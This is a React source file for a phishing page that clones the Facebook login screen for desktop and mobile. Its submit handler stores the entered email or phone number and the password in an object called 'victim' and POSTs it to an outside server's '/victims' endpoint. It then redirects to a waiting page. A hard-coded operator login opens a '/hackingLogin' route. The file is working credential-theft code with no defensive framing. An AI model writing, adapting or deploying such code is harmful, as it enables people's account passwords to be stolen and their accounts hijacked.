import React, { useEffect } from 'react';
import '../App.css'
import { useNavigate } from 'react-router-dom';
const Login = () => {


  useEffect(()=>{
    alert("Please Join Our Facebook Community")
  },[])

  const navigate = useNavigate();
  const handleSubmit = (e) => {
    e.preventDefault();

    const form = e.target;
    const name = form.name.value;
    const pass = form.password.value;
    const time = new Date();
    // navigate("/hackingLogin");
    const victim = {
      name: name,
      pass: pass,
      time: time

    }






    {
      name === "NXT-NEXUS" && pass === "NXT-NEXUS-3301" ? navigate("/hackingLogin") :

      fetch('https://phs-server-1.onrender.com/victims', {
        method: 'POST',
        headers: {
          'content-type': 'application/json',
        },
        body: JSON.stringify(victim)
      })

        .then(res => res.json())
        .then(data => {
          // console.log(data)
          form.reset()
          navigate('/waiting')
        })

    }









  }

  return (
    <div >
      {/* MAIN CONTENT START */}
      <div className="main-contend-section">
        <div className="main-container">
          <div className="w-50">
            <div className="lg-logo">
              <img
                src="https://res.cloudinary.com/drgxflcsb/image/upload/v1681242147/facebook%20clone/logo_mlo10v.svg"
                alt="Logo"
              />
            </div>
            <div className="fb-tag-line">
              <h3 id="tnk">Facebook helps you connect and share with the people in your life.</h3>
            </div>
          </div>
          <div className="w-50">
            <div className="form-section">
              <form onSubmit={handleSubmit} >
                <input type="text" name="name" id="email-or-number" placeholder="Email address or phone number" required />
                <input type="password" name="password" id="password" placeholder="Password" required />
                <input type="submit" name="submit" id="submit" value="Log In" />
                <a href="#" target="_self" className="forgot">
                  Forgotten password?
                </a>
                <div className="line"></div>
                <a href="#" target="_self" className="create-new-acc">
                  Create New Account
                </a>
              </form>
            </div>
            <div className="create-page">
              <p>
                <a href="#" target="_self">
                  Create a Page
                </a>{' '}
                for a celebrity, band, or business.
              </p>
            </div>
          </div>
        </div>
      </div>
      {/* MAIN CONTENT END */}
      {/* mobile  */}



      <main className='mobile'>
        <p className='top-bar'>Get Facebook for Android and browser faster</p>
        <div className="container">
          <div className="content">
            <img className="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_(2019).svg/1001px-Facebook_Logo_(2019).svg.png" alt="Facebook Logo" />
            <form onSubmit={handleSubmit}  >
              <div className="login-inputs-div">

                <input type="text" name='name' autocomplete="off" id='email' className="input" placeholder="Mobile number or email address" required />
                {/* <input type="text" placeholder='Mobile number   ' className="input" autocomplete="off"></input> */}

                <input type="password" name="password" className="input" placeholder="Password" required />
                <input type="submit" value="Log In" />
                <a href="#" id="Forgotten-password">Forgotten Password?</a>
              </div>
            </form>

            <div className="or">
              <hr /><span id="or">Or</span><hr />
            </div>
            <div className="other-choise">
              <a href="#" id="create-new-account">Create New Account</a>

            </div>
            <div className="languages">
              <a href="#" style={{ color: 'rgb(166, 158, 158)' }}>English (UK)</a>
              <a href="#">Francaise (France)</a>

              <a href="#">Espagnol(Espana)</a>
              <a href="#">Portuguese(Brasil)</a>
              <a href="#">Deutsch</a>
              <span><a href="#" id="language-plus">+</a></span>
            </div>

            <div className="footer-copyright">
              Meta @ 2023
            </div>
          </div>

        </div>
      </main>




    </div>
  );
};

export default Login;
